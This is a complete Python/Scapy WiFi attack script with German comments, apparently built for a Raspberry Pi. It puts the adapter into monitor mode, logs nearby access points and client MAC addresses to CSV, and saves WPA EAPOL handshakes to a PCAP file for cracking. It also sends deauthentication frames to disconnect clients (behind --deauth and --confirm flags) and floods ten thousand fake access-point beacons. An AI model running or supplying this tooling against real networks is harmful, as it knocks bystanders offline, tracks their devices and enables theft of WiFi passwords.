#!/usr/bin/env python3
"""
WiFi Scanner & Tester
- Stoppt störende WLAN-Dienste (fix für "device busy")
- Erstellt automatisch Monitor-Interface (mon0)
- Sniffing & Speichern in PCAP (Wireshark-kompatibel)
- CSV-Logs für APs & Clients
- Handshake-Erkennung (EAPOL)
- Optional Deauth (--deauth --confirm --dry-run)
- Optional Fake-AP Flood (--fake-aps)
- Logging (inkl. Debug & Rotating Logs)
"""

import os
import sys
import argparse
import logging
from logging.handlers import RotatingFileHandler
import csv
import threading
import signal
import subprocess
import time
from datetime import datetime
from scapy.all import (
    sniff, Dot11, Dot11Elt, Dot11Beacon, Dot11ProbeResp, EAPOL,
    RadioTap, Dot11Deauth, Dot11ProbeReq, sendp, wrpcap
)
from scapy.utils import PcapWriter

# ----------------------------
# Argumente / CLI
# ----------------------------
parser = argparse.ArgumentParser(description="WiFi scanner (capture, detect APs/clients, capture handshakes, optional deauth/fake APs)")
parser.add_argument("--iface", "-i", default="mon0", help="Monitor interface (default mon0)")
parser.add_argument("--timeout", "-t", type=int, default=60, help="Initial scan timeout seconds (default 60)")
parser.add_argument("--pcap", default="/home/pi/wifi_capture.pcap", help="Output PCAP file for all packets")
parser.add_argument("--handshakes", default="/home/pi/handshakes.pcap", help="Output PCAP file for handshakes")
parser.add_argument("--csv-aps", default="/home/pi/wifi_aps.csv", help="CSV file for detected APs")
parser.add_argument("--csv-clients", default="/home/pi/wifi_clients.csv", help="CSV file for detected clients")
parser.add_argument("--deauth", action="store_true", help="Send deauth to detected clients of APs (DANGEROUS)")
parser.add_argument("--confirm", action="store_true", help="Confirm deauth (must be used with --deauth to actually send packets)")
parser.add_argument("--dry-run", action="store_true", help="If set, do not actually send deauth frames (only log what would be done)")
parser.add_argument("--fake-aps", action="store_true", help="Enable Fake AP flooding (many beacons/second)")
parser.add_argument("--debug", action="store_true", help="Enable debug log to stdout")
parser.add_argument("--rotatelogs", action="store_true", help="Enable rotating log file")
parser.add_argument("--logfile", default="/home/pi/wifi_edu.log", help="Log file path")
args = parser.parse_args()

INTERFACE = args.iface
TIMEOUT = args.timeout
PCAP_FILE = args.pcap
PCAP_HANDSHAKES = args.handshakes
CSV_APS = args.csv_aps
CSV_CLIENTS = args.csv_clients
DO_DEAUTH = args.deauth
DO_CONFIRM = args.confirm
DRY_RUN = args.dry_run
DO_FAKEAPS = args.fake_aps
DEBUG = args.debug

# ----------------------------
# Root check
# ----------------------------
if os.geteuid() != 0:
    print("Dieses Script benötigt Root-Rechte. Bitte mit sudo ausführen.")
    sys.exit(1)

# ----------------------------
# Logging (Rotating optional)
# ----------------------------
logger = logging.getLogger("wifi_edu")
logger.setLevel(logging.DEBUG if DEBUG else logging.INFO)
fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
if args.rotatelogs:
    handler = RotatingFileHandler(args.logfile, maxBytes=5*1024*1024, backupCount=3)
else:
    handler = logging.FileHandler(args.logfile)
handler.setFormatter(fmt)
logger.addHandler(handler)
if DEBUG:
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

logger.info("Script gestartet. Interface=%s timeout=%s deauth=%s confirm=%s dry-run=%s fake-aps=%s",
            INTERFACE, TIMEOUT, DO_DEAUTH, DO_CONFIRM, DRY_RUN, DO_FAKEAPS)

# ----------------------------
# WLAN Prozesse freigeben (gegen "device busy")
# ----------------------------
def free_interface(base_iface="wlan0"):
    blockers = ["wpa_supplicant", "dhcpcd", "NetworkManager"]
    for svc in blockers:
        try:
            logger.info("Stopping service %s (falls aktiv)...", svc)
            subprocess.run(f"systemctl stop {svc}", shell=True, check=False)
        except Exception as e:
            logger.debug("Service %s konnte nicht gestoppt werden: %s", svc, e)

    try:
        logger.info("Bringe Interface %s down...", base_iface)
        subprocess.run(f"ip link set {base_iface} down", shell=True, check=False)
    except Exception as e:
        logger.warning("Konnte Interface %s nicht down setzen: %s", base_iface, e)

    try:
        subprocess.run(f"iw dev {base_iface} del", shell=True, check=False)
        logger.info("Interface %s entfernt, falls noch belegt.", base_iface)
    except Exception:
        pass

free_interface("wlan0")

# ----------------------------
# Utility
# ----------------------------
def is_valid_mac(mac):
    if not isinstance(mac, str): return False
    parts = mac.split(":")
    if len(parts) != 6: return False
    for p in parts:
        try: int(p, 16)
        except: return False
    return True

def is_local_random(mac):
    return isinstance(mac, str) and mac.lower().startswith("02:")

# ----------------------------
# CSV init
# ----------------------------
def init_csv(path, header):
    if not os.path.exists(path):
        with open(path, "w", newline="") as f:
            csv.writer(f).writerow(header)

init_csv(CSV_APS, ["Timestamp","SSID","BSSID","Channel","Capabilities"])
init_csv(CSV_CLIENTS, ["Timestamp","Client MAC","Type","Target/AP or Requested SSID"])

# ----------------------------
# Shared structures
# ----------------------------
aps = {}
clients = {}
handshake_cache = {}
handshake_packets = {}
aps_lock = threading.Lock()
clients_lock = threading.Lock()
hs_lock = threading.Lock()

# ----------------------------
# Monitor-Interface Setup
# ----------------------------
try:
    if not os.path.exists(f"/sys/class/net/{INTERFACE}"):
        phy = subprocess.check_output(
            "iw dev wlan0 info | gawk '/wiphy/ {printf \"phy\" $2}'",
            shell=True, text=True
        ).strip()
        if not phy:
            phy = subprocess.check_output("iw dev | awk '/wiphy/ {print \"phy\"$2; exit}'", shell=True, text=True).strip()
        if phy:
            subprocess.run(f"iw {phy} interface add {INTERFACE} type monitor", shell=True, check=False)
            logger.info("Monitor-Interface %s erstellt (phy=%s).", INTERFACE, phy)
    subprocess.run(f"ip link set {INTERFACE} up", shell=True, check=False)
except Exception:
    logger.exception("Fehler beim Setup des Monitor-Interfaces")

if not os.path.exists(f"/sys/class/net/{INTERFACE}"):
    logger.error("Interface %s existiert nicht!", INTERFACE)
    sys.exit(1)

# ----------------------------
# PcapWriter
# ----------------------------
pcap_writer = PcapWriter(PCAP_FILE, append=True, sync=True)

# ----------------------------
# packet_handler
# ----------------------------
def packet_handler(pkt):
    try: pcap_writer.write(pkt)
    except: pass

    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt.addr2
        if not bssid: return
        ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else "?"
        channel = pkt[Dot11Elt:3].info[0] if pkt.haslayer(Dot11Elt, ID=3) else "?"
        with aps_lock:
            if bssid not in aps:
                aps[bssid] = (ssid, channel, "cap")
                logger.info("[AP] %s | %s | CH=%s", ssid, bssid, channel)
                with open(CSV_APS, "a", newline="") as f:
                    csv.writer(f).writerow([datetime.now(), ssid, bssid, channel, "cap"])

    if pkt.haslayer(Dot11):
        client_mac = pkt.addr2
        if not client_mac or is_local_random(client_mac): return
        if pkt.type == 0 and pkt.subtype == 4:  # Probe Request
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else ""
            with clients_lock:
                if client_mac not in clients:
                    clients[client_mac] = ("Probe", ssid)
                    logger.info("[Client Probe] %s -> %s", client_mac, ssid)
                    with open(CSV_CLIENTS, "a", newline="") as f:
                        csv.writer(f).writerow([datetime.now(), client_mac, "Probe", ssid])
        elif pkt.type == 2:  # Data
            ap_mac = pkt.addr1
            with clients_lock:
                if client_mac not in clients:
                    clients[client_mac] = ("Data", ap_mac)
                    logger.info("[Client Data] %s -> %s", client_mac, ap_mac)
                    with open(CSV_CLIENTS, "a", newline="") as f:
                        csv.writer(f).writerow([datetime.now(), client_mac, "Data", ap_mac])

    if pkt.haslayer(EAPOL):
        src, dst = pkt.addr2, pkt.addr1
        maybe_ap, maybe_client = (dst, src) if dst in aps else (src, dst)
        if maybe_ap and maybe_client:
            key = (maybe_ap, maybe_client)
            raw = bytes(pkt.getlayer(EAPOL))
            h = hash(raw)
            with hs_lock:
                if key not in handshake_cache:
                    handshake_cache[key] = set()
                    handshake_packets[key] = []
                handshake_cache[key].add(h)
                handshake_packets[key].append(pkt)
                logger.info("[EAPOL] %s <-> %s", maybe_ap, maybe_client)
                if len(handshake_cache[key]) >= 2:
                    wrpcap(PCAP_HANDSHAKES, handshake_packets[key], append=True)
                    logger.info("[HANDSHAKE SAVED] %s <-> %s", maybe_ap, maybe_client)
                    handshake_cache[key].clear()
                    handshake_packets[key].clear()

# ----------------------------
# Signal handler
# ----------------------------
stop_event = threading.Event()
def handle_signal(signum, frame):
    logger.info("Signal %s erhalten, beende...", signum)
    stop_event.set()
    pcap_writer.close()
    sys.exit(0)
signal.signal(signal.SIGINT, handle_signal)
signal.signal(signal.SIGTERM, handle_signal)

# ----------------------------
# Sniffer starten
# ----------------------------
sniff_thread = threading.Thread(target=lambda: sniff(iface=INTERFACE, prn=packet_handler, store=0, timeout=TIMEOUT), daemon=True)
sniff_thread.start()
sniff_thread.join()
pcap_writer.close()
logger.info("Scan beendet. APs=%d | Clients=%d", len(aps), len(clients))

# ----------------------------
# Deauth
# ----------------------------
def perform_deauth():
    if not DO_DEAUTH: return
    if not DO_CONFIRM: return
    with clients_lock:
        for client, (ctype, target) in clients.items():
            if ctype == "Data" and target in aps:
                pkt = RadioTap()/Dot11(addr1=client, addr2=target, addr3=target)/Dot11Deauth(reason=7)
                if DRY_RUN:
                    logger.info("[DRY] Deauth %s -> %s", target, client)
                else:
                    sendp(pkt, iface=INTERFACE, count=5, inter=0.1, verbose=0)
                    logger.info("[DEAUTH] %s -> %s", target, client)
perform_deauth()

# ----------------------------
# Fake AP Flood (optional)
# ----------------------------
def fake_ap_flood():
    ssids = [f"FakeAP_{i}" for i in range(10000)]
    while not stop_event.is_set():
        for ssid in ssids:
            pkt = RadioTap()/Dot11(type=0,subtype=8,
                                   addr1="ff:ff:ff:ff:ff:ff",
                                   addr2="02:11:22:33:44:55",
                                   addr3="02:11:22:33:44:55")/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid)
            sendp(pkt, iface=INTERFACE, count=1, inter=0, verbose=0)
        time.sleep(0.01)

if DO_FAKEAPS:
    logger.info("Starte Fake-AP Flood...")
    fake_thread = threading.Thread(target=fake_ap_flood, daemon=True)
    fake_thread.start()
    fake_thread.join()
